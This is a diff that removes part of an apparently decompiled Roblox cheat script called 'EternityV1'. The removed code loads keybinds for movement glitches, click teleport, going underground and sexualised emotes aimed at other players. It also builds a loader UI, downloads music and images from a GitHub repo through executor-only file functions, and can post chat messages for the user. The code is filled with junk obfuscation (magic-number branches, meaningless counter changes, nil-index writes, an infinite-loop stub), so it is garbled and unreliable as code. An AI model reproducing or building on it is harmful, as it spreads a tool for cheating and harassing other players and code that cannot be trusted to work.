-												_themeColor = Color3.fromRGB(tonumber(result.ThemeColorR) or 245, tonumber(result.ThemeColorG) or 190, tonumber(result.ThemeColorB) or 75)
-												if step7 < count2 then
-													return
-												end
-											end)
-										end
-
-										if result.Bind_ToggleGUI then
-											pcall(function()
-												tbl22.ToggleGUI = Enum.KeyCode[result.Bind_ToggleGUI]
-												if L1.step4 == 573096760 then
-													return
-												end
-											end)
-										end
-
-										if result.Bind_MinimizeGUI then
-											pcall(function()
-												tbl22.MinimizeGUI = Enum.KeyCode[result.Bind_MinimizeGUI]
-											end)
-										end
-
-										if result.Bind_GlitchMove then
-											pcall(function()
-												tbl22.GlitchMove = Enum.KeyCode[result.Bind_GlitchMove]
-											end)
-										end
-
-										if result.Bind_ClickTeleport then
-											pcall(function()
-												tbl22.ClickTeleport = Enum.KeyCode[result.Bind_ClickTeleport]
-											end)
-										end
-
-										if result.Bind_AnimatedTeleport then
-											pcall(function()
-												tbl22.AnimatedTeleport = Enum.KeyCode[result.Bind_AnimatedTeleport]
-												if count4 == 716484443 then
-													return
-												end
-											end)
-										end
-
-										if result.Bind_Trip then
-											pcall(function()
-												tbl22.Trip = Enum.KeyCode[result.Bind_Trip]
-											end)
-										end
-
-										if result.Bind_Reverse then
-											pcall(function()
-												tbl22.Reverse = Enum.KeyCode[result.Bind_Reverse]
-											end)
-										end
-
-										if result.Bind_Facebang then
-											pcall(function()
-												tbl22.Facebang = Enum.KeyCode[result.Bind_Facebang]
-												if count4 == 716484443 then
-													return
-												end
-											end)
-										end
-
-										if result.Bind_Pat then
-											pcall(function()
-												tbl22.Pat = Enum.KeyCode[result.Bind_Pat]
-											end)
-										end
-
-										if result.Bind_Headsit then
-											pcall(function()
-												tbl22.Headsit = Enum.KeyCode[result.Bind_Headsit]
-												if count4 > 711231328 then
-													return
-												end
-											end)
-										end
-
-										if result.Bind_Backhug then
-											pcall(function()
-												tbl22.Backhug = Enum.KeyCode[result.Bind_Backhug]
-											end)
-										end
-
-										if result.Bind_Fronthug then
-											pcall(function()
-												tbl22.Fronthug = Enum.KeyCode[result.Bind_Fronthug]
-												if step9 == 968130634 then
-													return
-												end
-											end)
-										end
-
-										if result.Bind_Propose then
-											pcall(function()
-												tbl22.Propose = Enum.KeyCode[result.Bind_Propose]
-											end)
-										end
-
-										if L1.step2 == 872722565 then
-											count4 -= 1785
-											step9 += 489
-											step6 -= 432
-											count += 1224
-											count2 -= 1017
-											n214 -= 1189
-											n215 = 561795693
-											step7 += 1672
-											L1.step2 = 510921086
-											step += 944
-											L1.step4 -= 997
-											return
-										end
-
-										if result.Bind_Hipbang then
-											pcall(function()
-												tbl22.Hipbang = Enum.KeyCode[result.Bind_Hipbang]
-												return
-											end)
-										end
-
-										if result.Bind_Bagpack then
-											pcall(function()
-												tbl22.Bagpack = Enum.KeyCode[result.Bind_Bagpack]
-
-												if n214 == step6 then
-												end
-											end)
-										end
-
-										if result.Bind_Goon then
-											pcall(function()
-												tbl22.Goon = Enum.KeyCode[result.Bind_Goon]
-												if L1.step2 == 872721990 then
-													return
-												end
-											end)
-										end
-
-										if result.Bind_CustomAttach then
-											pcall(function()
-												tbl22.CustomAttach = Enum.KeyCode[result.Bind_CustomAttach]
-
-												if n215 == step9 then
-													step7 -= 923
-													L1.step2 = 776235084
-													count = 297937658
-													n215 -= 1739
-													step9 = 211434003
-													L1.step4 -= 259
-													count4 = 493983327
-												end
-											end)
-										end
-
-										if result.CustomAttachEmoteId ~= nil then
-											CustomAttachEmoteId = tostring(result.CustomAttachEmoteId)
-										end
-
-										if result.CustomAttachFacing ~= nil then
-											CustomAttachFacing = tostring(result.CustomAttachFacing)
-										end
-
-										if result.CustomAttachOffsetX ~= nil then
-											CustomAttachOffsetX = tonumber(result.CustomAttachOffsetX) or 0
-										end
-
-										if result.CustomAttachOffsetY ~= nil then
-											CustomAttachOffsetY = tonumber(result.CustomAttachOffsetY) or 0
-										end
-
-										if result.CustomAttachOffsetZ ~= nil then
-											CustomAttachOffsetZ = tonumber(result.CustomAttachOffsetZ) or 2.5
-										end
-
-										if result.Bind_Fakeout then
-											pcall(function() end)
-										end
-
-										if result.Bind_GlitchDesync then
-											pcall(function()
-												tbl22.GlitchDesync = Enum.KeyCode[result.Bind_GlitchDesync]
-												if step7 == 615741932 then
-													return
-												end
-											end)
-										end
-
-										if result.Bind_GoUnderground then
-											pcall(function()
-												tbl22.GoUnderground = Enum.KeyCode[result.Bind_GoUnderground]
-											end)
-										end
-
-										if result.SavedAnimations and typeof(result.SavedAnimations) == "table" then
-											tbl18.SavedAnimations = result.SavedAnimations
-										end
-
-										if result.FavoriteAnimations and typeof(result.FavoriteAnimations) == "table" then
-											tbl18.FavoriteAnimations = result.FavoriteAnimations
-										end
-
-										if result.PlatformMode and (result.PlatformMode == "Phone" or result.PlatformMode == "PC") then
-											getgenv().EternityPlatformMode = result.PlatformMode
-										end
-
-										if result.MobileButtonsEnabled ~= nil then
-											tbl18.MobileButtonsEnabled = result.MobileButtonsEnabled
-										end
-
-										if result.MobileButtonPositions and typeof(result.MobileButtonPositions) == "table" then
-											tbl18.MobileButtonPositions = result.MobileButtonPositions
-										end
-									end
-								end
-							end)
-
-							return
-						end
-					end
-
-					function runAutoExecutes()
-						task.spawn(function()
-							task.wait(1.5)
-
-							if step8 == 975381697 then
-								L1.step2 += 1595
-								count = 630559958
-								step8 = 258406368
-								step += 1754
-							else
-								for k, v3 in pairs(tbl19) do
-									if tbl18[k] then
-										pcall(function()
-											if L1.step2 == 872721990 then
-												v3(true)
-												return
-											end
-										end)
-									end
-								end
-							end
-						end)
-					end
-
-					loadSettings()
-
-					tbl17 = {
-						bg = Color3.fromRGB(8, 8, 8),
-						bgCard = Color3.fromRGB(14, 14, 14),
-						surface = Color3.fromRGB(20, 20, 20),
-						surfaceHover = Color3.fromRGB(28, 28, 28),
-						input = Color3.fromRGB(24, 24, 24),
-					}
-
-					tbl17.accent = _themeColor or Color3.fromRGB(248, 248, 255)
-					local themeColor = _themeColor
-
-					if themeColor then
-						themeColor = Color3.new(_themeColor.R * 0.75, _themeColor.G * 0.75, _themeColor.B * 0.75)
-					end
-
-					tbl17.accentDim = themeColor or Color3.fromRGB(180, 180, 185)
-					tbl17.accentGlow = _themeColor or Color3.fromRGB(248, 248, 255)
-					tbl17.danger = Color3.fromRGB(230, 70, 70)
-					tbl17.dangerDim = Color3.fromRGB(160, 50, 50)
-					tbl17.success = Color3.fromRGB(80, 220, 140)
-					tbl17.warning = Color3.fromRGB(240, 180, 60)
-					tbl17.text = Color3.fromRGB(220, 220, 228)
-					tbl17.textMuted = Color3.fromRGB(100, 100, 115)
-					tbl17.textDim = Color3.fromRGB(60, 60, 72)
-					tbl17.white = Color3.fromRGB(245, 245, 250)
-					tbl17.black = Color3.fromRGB(6, 6, 8)
-					tbl17.toggleOn = _themeColor or Color3.fromRGB(248, 248, 255)
-					tbl17.toggleOff = Color3.fromRGB(50, 50, 60)
-					tbl17.toggleKnob = Color3.fromRGB(240, 240, 245)
-					tbl17.divider = Color3.fromRGB(35, 35, 45)
-					tbl17.sidebarBg = Color3.fromRGB(12, 12, 16)
-					tbl17.sidebarIcon = Color3.fromRGB(160, 160, 170)
-					tbl17.sidebarActive = _themeColor or Color3.fromRGB(248, 248, 255)
-					tbl17.statsBg = Color3.fromRGB(18, 18, 24)
-
-					function getRGBString(arg)
-						if step7 < step then
-							return math.floor(arg.R * 255 + 0.5) .. "," .. math.floor(arg.G * 255 + 0.5) .. "," .. math.floor(arg.B * 255 + 0.5)
-						end
-					end
-
-					getRGBString(tbl17.accent)
-
-					function tween(instance2, arg, arg2, arg3, arg4)
-						if instance2 and instance2.Parent then
-							local tweenInfo = TweenInfo.new(arg2 or 0.3, arg3 or Enum.EasingStyle.Quint, arg4 or Enum.EasingDirection.Out)
-
-							TweenService2:Create(instance2, tweenInfo, arg):Play()
-							return
-						end
-					end
-
-					function tweenWait(instance2, arg, arg2, arg3, arg4)
-						if not (instance2 and instance2.Parent) then
-							return
-						end
-						local tweenInfoNew = TweenInfo.new
-						local n222 = arg2 or 0.3
-
-						do
-							local v3 = tweenInfoNew(n222, arg3, arg4 or Enum.EasingDirection.Out)
-							local tween_ = TweenService2:Create(instance2, v3, arg)
-							tween_:Play()
-							tween_.Completed:Wait()
-							return
-						end
-					end
-
-					function corner(arg, arg2)
-						local uiCorner = Instance.new("UICorner", arg)
-						uiCorner.CornerRadius = UDim.new(0, arg2 or 8)
-						if step8 > 840307239 then
-							return uiCorner
-						end
-					end
-
-					function stroke(arg, color, thickness, transparency)
-						local uiStroke = Instance.new("UIStroke", arg)
-						uiStroke.Color = color or tbl17.accent
-						uiStroke.Thickness = thickness or 1
-						local n222 = 206809638
-						uiStroke.Transparency = transparency or 0.6
-						uiStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
-
-						if n222 == step6 then
-							step7 -= 1420
-							step6 -= 1852
-							count = 59835576
-							L1.step3 += 1876
-							step -= 172
-							L1.step2 -= 791
-							L1.step4 -= 1169
-							step8 += 713
-							return
-						end
-
-						return uiStroke
-					end
-
-					function applyStroke(arg, arg2, arg3, arg4)
-						if step8 == 975380873 then
-							return stroke(arg, arg2, arg3, arg4)
-						end
-					end
-
-					function padding(arg, arg2, arg3, arg4, arg5)
-						local uiPadding2 = Instance.new("UIPadding", arg)
-						uiPadding2.PaddingTop = UDim.new(0, arg2 or 0)
-						local n222 = 0
-						uiPadding2.PaddingBottom = UDim.new(n222, arg3 or 0)
-						uiPadding2.PaddingLeft = UDim.new(n222, arg4 or 0)
-						uiPadding2.PaddingRight = UDim.new(0, arg5 or 0)
-						if step == 948147176 then
-							return uiPadding2
-						end
-					end
-
-					function gradient(arg, arg2, arg3, rotation)
-						local uiGradient = Instance.new("UIGradient", arg)
-						local colorSequenceNew = ColorSequence.new
-						uiGradient.Color = colorSequenceNew(arg2, arg3)
-						uiGradient.Rotation = rotation or 90
-
-						return uiGradient
-					end
-
-					local n225 = nil
-
-					function sendChat(arg)
-						n225 = 93801602
-						local count3 = 463031016
-
-						if count3 < L1.step2 then
-							task.spawn(function()
-								if n225 == 93801602 then
-									pcall(function()
-										if TextChatService2.ChatVersion ~= Enum.ChatVersion.TextChatService then
-											ReplicatedStorage2.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(arg, "All")
-										else
-											local rbxGeneral = TextChatService2.TextChannels:FindFirstChild("RBXGeneral")
-
-											if rbxGeneral then
-												rbxGeneral:SendAsync(arg)
-											end
-										end
-									end)
-
-									return
-								end
-							end)
-						else
-							n225 = 289981886
-							step7 -= 907
-							step6 -= 1192
-							step -= 1588
-							L1.step3 -= 1847
-							L1.step2 += 1282
-							L1.step4 += 1861
-							step8 -= 889
-							count = 1025512132
-							upv133[967835854] = nil
-							upv133[nil] = nil --[[?NilIndex]]
-						end
-					end
-				end
-
-				function getTimeGreeting()
-					local packed = table.pack(os.date("%H"))
-					local num = tonumber(table.unpack(packed, 1, packed.n))
-					if num < 12 then
-						return "Good morning"
-					end
-
-					if num < 17 then
-						return "Good afternoon"
-					end
-
-					if num < 21 then
-						return "Good evening"
-					end
-					return "Good night"
-				end
-
-				function getExecutorName()
-					local executor = "Unknown"
-
-					pcall(function()
-						if identifyexecutor then
-							executor = identifyexecutor()
-						elseif getexecutorname then
-							executor = getexecutorname()
-						end
-					end)
-
-					return executor
-				end
-
-				function getAccountAge()
-					local accountAge = localPlayer_2.AccountAge
-
-					if not (accountAge >= 365) then
-						if not (accountAge >= 30) then
-							return accountAge .. " Days"
-						end
-						return math.floor(accountAge / 30) .. " Months"
-					end
-
-					return math.floor(accountAge / 365) .. " Years"
-				end
-
-				local screenGui2 = Instance.new("ScreenGui")
-				screenGui2.Name = "EternityV1"
-				getgenv().EternityV1_UI = screenGui2
-				screenGui2.ResetOnSpawn = false
-				screenGui2.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-				screenGui2.IgnoreGuiInset = true
-
-				do
-					function makeSound(soundId, volume)
-						if soundId == "" then
-							return {
-								Play = function()
-									if not (step7 < 658798970) then
-										L1.step2 = 798979101
-										count -= 1217
-										step += 1793
-										L1.step3 = 175645057
-										L1.step4 = 443344829
-										step8 += 154
-										step7 = 936973942
-									end
-								end,
-								Stop = function()
-								end,
-								Clone = function()
-									while true do
-									end
-								end,
-							}
-						end
-
-						local sound = Instance.new("Sound")
-						sound.SoundId = soundId
-						sound.Volume = volume or 0.6
-						sound.RollOffMaxDistance = 0
-						sound.Parent = game:GetService("SoundService")
-
-						if step == count then
-							step7 = 1045895573
-							step6 = 286304562
-							L1.step4 -= 1296
-							L1.step2 = 517975941
-							L1.step3 = 115147810
-							step8 = 1032099086
-							step = 29058766
-							count -= 1260
-							local packed
-							packed = table.pack((packed[1])(nil))
-						end
-
-						return sound
-					end
-				end
-
-				local v3 = makeSound("rbxassetid://98797174600699", 0.5)
-				local tbl18 = { sfxHover = makeSound("rbxassetid://6895079853", 0.2) }
-
-				local tbl19 = {
-					tracks = {
-						{
-							title = "Too Many Nights",
-							file = "eternity_loader/too_many_nights.mp3",
-							url = "https://raw.githubusercontent.com/hor1zencodes/patanahi/main/Too%20Many%20Nights%20(Instrumental)(1).mp3",
-						},
-						{
-							title = "Butterfly Effect",
-							file = "eternity_loader/butterfly_effect.mp3",
-							url = "https://raw.githubusercontent.com/hor1zencodes/patanahi/main/Travis%20Scott%20-%20BUTTERFLY%20EFFECT%20(Instrumental).mp3",
-						},
-					},
-					currentIdx = 1,
-					isPlaying = false,
-					sound = nil,
-					waveBars = {},
-					trackLabel = nil,
-					playIcon = nil,
-				}
-
-				tbl19.currentIdx = math.random(1, #tbl19.tracks)
-
-				do
-					function tbl19.stop(self)
-						pcall(function()
-							if self.sound then
-								self.sound:Stop()
-								self.sound:Destroy()
-								self.sound = nil
-							end
-
-							local SoundService = game:GetService("SoundService")
-
-							for _, child in ipairs(SoundService:GetChildren()) do
-								if child:IsA("Sound") and child.Name == "EternityLoaderMusic" then
-									child:Stop()
-									child:Destroy()
-									continue
-								end
-							end
-						end)
-
-						self.isPlaying = false
-
-						if self.playIcon then
-							self.playIcon.Image = "rbxassetid://117198184887189"
-						end
-					end
-				end
-
-				function tbl19.play(self, n204)
-					local len = #self.tracks
-
-					if n204 then
-						self.currentIdx = math.max(1, math.min(len, n204))
-					end
-
-					local track = self.tracks[self.currentIdx]
-					if not track then
-						return
-					end
-
-					if self.trackLabel then
-						self.trackLabel.Text = track.title
-					end
-
-					task.spawn(function()
-						local callback = getcustomasset or getsynasset
-
-						if isfile and writefile and callback then
-							pcall(function()
-								if makefolder and not isfolder("eternity_loader") then
-									makefolder("eternity_loader")
-								end
-							end)
-
-							if not isfile(track.file) then
-								if self.trackLabel then
-									self.trackLabel.Text = "Downloading..."
-								end
-
-								local ok, response = pcall(game.HttpGet, game, track.url)
-
-								if ok and response and #response > 1000 then
-									pcall(writefile, track.file, response)
-								end
-							end
-
-							if self.trackLabel then
-								self.trackLabel.Text = track.title
-							end
-
-							if isfile(track.file) then
-								local ok, soundId = pcall(callback, track.file)
-
-								if ok and soundId then
-									if not (self.sound and self.sound.Parent) then
-										self.sound = Instance.new("Sound")
-										self.sound.Name = "EternityLoaderMusic"
-
-										if L1.step3 ~= 921533470 then
-											L1.step2 = 434292627
-											count += 1712
-										end
-
-										self.sound.Volume = 0.35
-										self.sound.Looped = true
-										self.sound.RollOffMaxDistance = 0
-										self.sound.Parent = game:GetService("SoundService")
-									end
-
-									self.sound.SoundId = soundId
-									self.sound.TimePosition = 0
-									self.sound:Play()
-									self.isPlaying = true
-
-									if self.playIcon then
-										self.playIcon.Image = "rbxassetid://114293537715714"
-									end
-								end
-							end
-
-							return
-						end
-					end)
-				end
-
-				function tbl19.toggle(self)
-					if not self.sound then
-						self:play(self.currentIdx)
-						return
-					end
-
-					if self.isPlaying then
-						pcall(function()
-							self.sound:Pause()
-						end)
-
-						self.isPlaying = false
-
-						if self.playIcon then
-							self.playIcon.Image = "rbxassetid://117198184887189"
-						end
-					else
-						pcall(function()
-							if self.sound.IsPaused then
-								self.sound:Resume()
-							else
-								self.sound:Play()
-							end
-
-							if L1.step4 ~= 573096760 then
-								step += 1633
-								step6 = 651338978
-								L1.step2 = 98866811
-								L1.step4 += 1439
-								upv118 = nil
-							end
-						end)
-
-						self.isPlaying = true
-
-						if self.playIcon then
-							self.playIcon.Image = "rbxassetid://114293537715714"
-						end
-					end
-				end
-
-				do
-					function tbl19.next(self)
-						local n206 = self.currentIdx % #self.tracks + 1
-
-						self:play(n206)
-					end
-				end
-
-				local tbl20 = {
-					Play = function()
-						tbl19:play()
-					end,
-					Stop = function()
-						tbl19:stop()
-					end,
-					Destroy = function()
-						tbl19:stop()
-					end,
-				}
-
-				task.spawn(function()
-					if count < L1.step3 then
-						pcall(function()
-							game:GetService("ContentProvider"):PreloadAsync({ v3 })
-						end)
-
-						return
-					end
-				end)
-
-				local frame12 = Instance.new("Frame", screenGui2)
-				frame12.Name = "KeyOverlay"
-				frame12.Size = UDim2.new(1, 0, 1, 0)
-				frame12.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-				frame12.BackgroundTransparency = 1
-				frame12.BorderSizePixel = 0
-				frame12.ZIndex = 100
-				frame12.ClipsDescendants = false
-				local imageLabel5 = Instance.new("ImageLabel", frame12)
-				imageLabel5.Name = "LoaderScreenBg"
-				imageLabel5.Size = UDim2.new(1, 0, 1, 0)
-				imageLabel5.Position = UDim2.new(0, 0, 0, 0)
-				imageLabel5.BackgroundColor3 = Color3.fromRGB(6, 6, 10)
-				imageLabel5.BorderSizePixel = 0
-				imageLabel5.ScaleType = Enum.ScaleType.Crop
-				imageLabel5.ImageTransparency = 1
-				imageLabel5.ZIndex = 94
-				local uiScale = Instance.new("UIScale", imageLabel5)
-				uiScale.Scale = 1.06
-
-				task.spawn(function()
-					local count2 = 30170938
-					local callback = getcustomasset or getsynasset
-
-					if isfile and writefile and callback then
-						pcall(function()
-							if not isfolder("eternity") then
-								makefolder("eternity")
-							end
-
-							if count ~= 200206612 then
-								count2 -= 1841
-								L1.step2 -= 1019
-								count = 868105652
-								step7 -= 71
-								step8 = 107670752
-								L1.step3 += 1494
-
-								upv122[nil] = nil
-							end
-						end)
-
-						if not isfile("eternity/loader_wallpaper_frame22.png") then
-							local ok, response = pcall(game.HttpGet, game, "https://raw.githubusercontent.com/hor1zencodes/patanahi/main/Frame%2022.png")
-
-							if ok and response and #response > 100 then
-								pcall(writefile, "eternity/loader_wallpaper_frame22.png", response)
-							end
-						end
-
-						if isfile("eternity/loader_wallpaper_frame22.png") then
-							local ok, image = pcall(callback, "eternity/loader_wallpaper_frame22.png")
-
-							if count2 == L1.step2 then
-							end
-
-							if ok and image and imageLabel5 and imageLabel5.Parent then
-								imageLabel5.Image = image
-							end
-						end
-					end
-				end)
-
-				local frame13 = Instance.new("Frame", frame12)
-				frame13.Name = "CornerVignette"
-				frame13.Size = UDim2.new(1, 0, 1, 0)
-				frame13.Position = UDim2.new(0, 0, 0, 0)
-				frame13.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-				frame13.BackgroundTransparency = 1
-				frame13.BorderSizePixel = 0
-				frame13.ZIndex = 96
-
-				do
-					pcall(function()
-						tbl20:Stop()
-						tbl20.TimePosition = 0
-						tbl20:Play()
-					end)
-				end
-
-				local touchEnabled2 = UserInputService2.TouchEnabled
-
-				if touchEnabled2 then
-					touchEnabled2 = not UserInputService2.KeyboardEnabled
-				end
-
-				local udim23, frame14, tbl21, fn16, fn17, frame15, frame16, frame17, frame18, frame19
-				local uiScale2, fn18, connection, frame20, textLabel7, frame21
-
-				do
-					local currentCamera = workspace.CurrentCamera
-					local viewportSize = currentCamera
-
-					if viewportSize then
-						viewportSize = currentCamera.ViewportSize
-					end
-
-					viewportSize = viewportSize or Vector2.new(1920, 1080)
-
-					if viewportSize.X == 0 or viewportSize.Y == 0 then
-						viewportSize = Vector2.new(1920, 1080)
-					end
-
-					if getgenv().EternityPlatformMode ~= "Phone" and not touchEnabled2 and viewportSize.Y > 0 then
-					end
-
-					local vector2 = Vector2.new(0.5, 0.5)
-					UDim2.new(0.5, 0, 1.4, 0)
-					udim23 = UDim2.new(0.5, 0, 0.5, 0)
-					UDim2.new(0.5, 0, 1.4, 0)
-					frame14 = Instance.new("Frame", frame12)
-					frame14.Name = "KeyCard"
-					frame14.AnchorPoint = vector2
-					frame14.Size = UDim2.new(0, 920, 0, 470)
-					frame14.Position = udim23
-					frame14.BackgroundColor3 = Color3.fromRGB(10, 10, 14)
-					frame14.BorderSizePixel = 0
-					frame14.BackgroundTransparency = 1
-					frame14.ClipsDescendants = false
-					frame14.ZIndex = 101
-					tbl21 = {}
-
-					fn17 = function(frame22, arg, color)
-						frame22.ClipsDescendants = true
-						corner(frame22, arg or 14)
-						local imageLabel6 = Instance.new("ImageLabel", frame22)
-						imageLabel6.Name = "BoxBackground"
-						imageLabel6.Size = UDim2.new(1, 0, 1, 0)
-						imageLabel6.Position = UDim2.new(0, 0, 0, 0)
-						imageLabel6.BackgroundColor3 = Color3.fromRGB(12, 12, 18)
-						imageLabel6.BorderSizePixel = 0
-						imageLabel6.ScaleType = Enum.ScaleType.Crop
-						imageLabel6.Image = "rbxassetid://" .. (_uiBackgroundId or "72660622902200")
-						imageLabel6.ImageColor3 = Color3.fromRGB(240, 240, 250)
-						imageLabel6.ImageTransparency = 0.35
-						imageLabel6.ZIndex = 101
-						corner(imageLabel6, arg or 14)
-						local frame23 = Instance.new("Frame", frame22)
-						frame23.Name = "BoxScrim"
-						frame23.Size = UDim2.new(1, 0, 1, 0)
-						frame23.Position = UDim2.new(0, 0, 0, 0)
-						frame23.BackgroundColor3 = Color3.fromRGB(10, 10, 16)
-						frame23.BackgroundTransparency = 0.45
-						frame23.BorderSizePixel = 0
-						frame23.ZIndex = 101
-						corner(frame23, arg or 14)
-						local v4 = stroke(frame22, color or Color3.fromRGB(48, 52, 75), 1, 0.72)
-						v4.ZIndex = 102
-						local uiGradient = Instance.new("UIGradient", v4)
-
-						uiGradient.Color = ColorSequence.new({
-							ColorSequenceKeypoint.new(0, Color3.fromRGB(85, 95, 135)),
-							ColorSequenceKeypoint.new(0.5, Color3.fromRGB(45, 48, 68)),
-							ColorSequenceKeypoint.new(1, Color3.fromRGB(25, 28, 40)),
-						})
-
-						uiGradient.Transparency = NumberSequence.new({
-							NumberSequenceKeypoint.new(0, 0.55),
-							NumberSequenceKeypoint.new(0.5, 0.75),
-							NumberSequenceKeypoint.new(1, 0.88),
-						})
-
-						uiGradient.Rotation = 90
-						return imageLabel6, frame23, v4
-					end
-
-					local frame22 = nil
-					local eternityPlatformMode = getgenv().EternityPlatformMode == "Phone" or getgenv().EternityPlatformMode == "PC"
-
-					if eternityPlatformMode then
-						eternityPlatformMode = getgenv().EternityPlatformMode
-					end
-
-					eternityPlatformMode = eternityPlatformMode or "PC"
-					uiScale2 = Instance.new("UIScale", frame14)
-
-					fn18 = function()
-						if frame14 and frame14.Parent then
-							local currentCamera2 = workspace.CurrentCamera
-							local viewportSize2 = currentCamera2
-
-							if viewportSize2 then
-								viewportSize2 = currentCamera2.ViewportSize
-							end
-
-							viewportSize2 = viewportSize2 or Vector2.new(1920, 1080)
-
-							if viewportSize2.X == 0 or viewportSize2.Y == 0 then
-								viewportSize2 = Vector2.new(1920, 1080)
-							end
-
-							local y = 0
-							local y2 = 0
-
-							pcall(function()
-								local guiInset, v4 = game:GetService("GuiService"):GetGuiInset()
-
-								if guiInset and guiInset.Y then
-									y = guiInset.Y
-								end
-
-								if v4 and v4.Y then
-									y2 = v4.Y
-								end
-							end)
-
-							local touchEnabled3 = UserInputService2.TouchEnabled
-
-							if touchEnabled3 then
-								touchEnabled3 = not UserInputService2.KeyboardEnabled
-							end
-
-							local flag10
-							local count5 = 440
-							local count6 = 470
-							local n207 = 24
-							local n208 = 16
-
-							if not touchEnabled3 then
-								local flag11 = getgenv().EternityPlatformMode == "Phone" or eternityPlatformMode == "Phone"
-
-								if flag11 and y < 36 then
-									y = 36
-								end
-
-								if flag11 and y2 < 14 then
-									y2 = 14
-								end
-
-								flag10 = viewportSize2.X < viewportSize2.Y or viewportSize2.X < 580
-
-								if flag10 then
-									count6 = 680
-								else
-									count5 = 920
-									local flag12 = flag11
-
-									if flag12 then
-										flag12 = 48
-									end
-
-									n207 = flag12 or 24
-
-									if flag11 then
-										flag11 = 16
-									end
-
-									if not flag11 then
-										flag11 = 20
-										n208 = flag11
-									else
-										n208 = flag11
-									end
-								end
-							else
-								if y < 36 then
-									y = 36
-								end
-
-								if y2 < 14 then
-									y2 = 14
-								end
-
-								flag10 = viewportSize2.X < viewportSize2.Y or viewportSize2.X < 580
-
-								if flag10 then
-									count6 = 680
-								else
-									count5 = 920
-									n207 = 48
-								end
-							end
-
-							local n209 = math.max(viewportSize2.Y - y - y2, 200)
-							local n210 = math.max(viewportSize2.X - n207, 200)
-							local n211 = math.max(n209 - n208, 180) / count6
-							local n212 = math.min(n210 / count5, n211, 1)
-							local scale = math.clamp(n212, 0.4, 1.05)
-							frame14.Size = UDim2.new(0, count5, 0, count6)
-							uiScale2.Scale = scale
-							tbl21.targetScale = scale
-							udim23 = UDim2.new(0.5, 0, 0, math.floor(y + n209 * 0.5))
-							frame14.Position = udim23
-
-							if frame15 and frame17 and frame16 and frame18 then
-								if flag10 then
-									frame15.Size = UDim2.new(1, -20, 0, 620)
-									frame15.Position = UDim2.new(0, 10, 0, 56)
-									frame17.Size = UDim2.new(1, 0, 0, 360)
-									frame17.Position = UDim2.new(0, 0, 0, 0)
-									frame16.Size = UDim2.new(0.485, 0, 0, 250)
-									frame16.Position = UDim2.new(0, 0, 0, 370)
-									frame18.Size = UDim2.new(0.485, 0, 0, 250)
-									frame18.Position = UDim2.new(0.515, 0, 0, 370)
-
-									if frame19 then
-										frame19.Visible = false
-									end
-
-									if frame22 then
-										frame22.Visible = false
-									end
-								else
-									frame15.Size = UDim2.new(1, -20, 1, -68)
-									frame15.Position = UDim2.new(0, 10, 0, 64)
-									frame16.Size = UDim2.new(0.28, -7, 1, 0)
-									frame16.Position = UDim2.new(0, 0, 0, 0)
-									frame17.Size = UDim2.new(0.44, -7, 1, 0)
-									frame17.Position = UDim2.new(0.28, 3, 0, 0)
-									frame18.Size = UDim2.new(0.28, -7, 1, 0)
-									frame18.Position = UDim2.new(0.72, 7, 0, 0)
-
-									if frame19 then
-										frame19.Visible = true
-									end
-
-									if frame22 then
-										frame22.Visible = true
-									end
-								end
-							end
-
-							return
-						end
-					end
-
-					fn18()
-
-					if currentCamera then
-						connection = currentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(function()
-							if frame14 and frame14.Parent then
-								fn18()
-								return
-							end
-
-							if connection then
-								connection:Disconnect()
-							end
-						end)
-					end
-
-					frame20 = Instance.new("Frame", frame14)
-					frame20.Name = "TopBar"
-					frame20.Size = UDim2.new(1, -20, 0, 48)
-					frame20.Position = UDim2.new(0, 10, 0, 10)
-					frame20.BackgroundColor3 = Color3.fromRGB(14, 14, 20)
-					frame20.BackgroundTransparency = 0.3
-					frame20.BorderSizePixel = 0
-					frame20.ZIndex = 103
-					local topBg, topScrim, topStroke = fn17(frame20, 12, Color3.fromRGB(42, 44, 60))
-					tbl21.topBg = topBg
-					tbl21.topScrim = topScrim
-					tbl21.topStroke = topStroke
-					local imageLabel6 = Instance.new("ImageLabel", frame20)
-					imageLabel6.Name = "LeftLogo"
-					imageLabel6.Size = UDim2.new(0, 30, 0, 30)
-					imageLabel6.Position = UDim2.new(0, 12, 0.5, -15)
-					imageLabel6.Image = "rbxassetid://139175707588865"
-					imageLabel6.BackgroundTransparency = 1
-					imageLabel6.ScaleType = Enum.ScaleType.Fit
-					imageLabel6.ZIndex = 104
-					textLabel7 = Instance.new("TextLabel", frame20)
-					textLabel7.Name = "KeyTitle"
-					textLabel7.Size = UDim2.new(0, 180, 0, 22)
-					textLabel7.Position = UDim2.new(0, 48, 0.5, -11)
-					textLabel7.Text = ""
-					textLabel7.Font = Enum.Font.GothamBold
-					textLabel7.TextSize = 15
-					textLabel7.TextColor3 = Color3.fromRGB(245, 245, 255)
-					textLabel7.BackgroundTransparency = 1
-					textLabel7.TextXAlignment = Enum.TextXAlignment.Left
-					textLabel7.ZIndex = 104
-					frame21 = Instance.new("Frame", frame20)
-					frame21.Name = "TitleAccent"
-					frame21.Size = UDim2.new(0, 36, 0, 2)
-					frame21.Position = UDim2.new(0, 48, 1, -5)
-					frame21.BackgroundColor3 = tbl17.accent
-					frame21.BorderSizePixel = 0
-					frame21.ZIndex = 104
-					corner(frame21, 1)
-					local frame23 = Instance.new("Frame", frame20)
-					frame23.Name = "RowVersion"
-					frame23.Size = UDim2.new(0, 72, 0, 24)
-					frame23.Position = UDim2.new(0, 235, 0.5, -12)
-					frame23.BackgroundColor3 = Color3.fromRGB(20, 20, 28)
-					frame23.BackgroundTransparency = 0.3
-					frame23.BorderSizePixel = 0
-					frame23.ZIndex = 104
-					corner(frame23, 6)
-					stroke(frame23, Color3.fromRGB(50, 54, 75), 1, 0.5)
-					local imageLabel7 = Instance.new("ImageLabel", frame23)
-					imageLabel7.Size = UDim2.new(0, 12, 0, 12)
-					imageLabel7.Position = UDim2.new(0, 6, 0.5, -6)
-					imageLabel7.BackgroundTransparency = 1
-					imageLabel7.Image = "rbxassetid://123241505047407"
-					imageLabel7.ZIndex = 105
-					local textLabel8 = Instance.new("TextLabel", frame23)
-					textLabel8.Size = UDim2.new(0, 0, 0, 0)
-					textLabel8.Text = ""
-					textLabel8.Visible = false
-					local textLabel9 = Instance.new("TextLabel", frame23)
-					textLabel9.Size = UDim2.new(1, -22, 1, 0)
